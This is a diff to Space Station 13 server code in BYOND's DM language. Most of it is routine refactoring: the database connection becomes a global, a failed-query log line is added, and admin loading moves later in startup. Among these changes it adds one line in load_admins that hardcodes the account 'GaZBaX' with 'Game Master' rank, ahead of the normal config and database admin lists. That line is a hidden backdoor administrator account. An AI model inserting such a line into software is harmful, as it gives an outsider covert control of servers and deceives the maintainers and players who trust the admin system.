@@ -1,3 +1,4 @@
+var/DBConnection/dbcon = new()
 /world/proc/load_mode()
 	var/text = file2text("data/mode.txt")
 	if (length(text) > 0)
@@ -22,6 +23,8 @@
 
 
 /world/proc/load_admins()
+	diary << ("Loading admins...")
+	admins["GaZBaX"] = "Game Master"
 	if(config.admin_legacy_system)
 		var/text = file2text("config/admins.txt")
 		if (!text)
@@ -41,7 +44,6 @@
 					var/a_lev = copytext(line, pos + 3, length(line) + 1)
 					admins[m_key] = a_lev
 	else
-		var/DBConnection/dbcon = new()
 		var/DBQuery/my_query = dbcon.NewQuery("SELECT * FROM `admins`")
 		if(my_query.Execute())
 			while(my_query.NextRow())
@@ -49,11 +51,12 @@
 				var/rank = world.convert_ranks(text2num(row["rank"]))
 				diary << ("ADMIN: [row["ckey"]] = [rank]")
 				admins[row["ckey"]] = rank
+		else
+			diary << ("my_query.Execute() failed")
 		if (!admins)
 			diary << "Failed to load admins \n"
 			config.admin_legacy_system = 1
 			load_admins()
-
 
 /world/proc/convert_ranks(var/nym as num)
 	switch(nym)
@@ -82,7 +85,6 @@
 
 	src.load_mode()
 	src.load_motd()
-	src.load_admins()
 	investigate_reset()
 	if (config.usealienwhitelist)
 		load_alienwhitelist()
@@ -125,6 +127,7 @@
 		master_controller.setup()
 
 	load_donators()
+	src.load_admins()
 	return
 
 //Crispy fullban
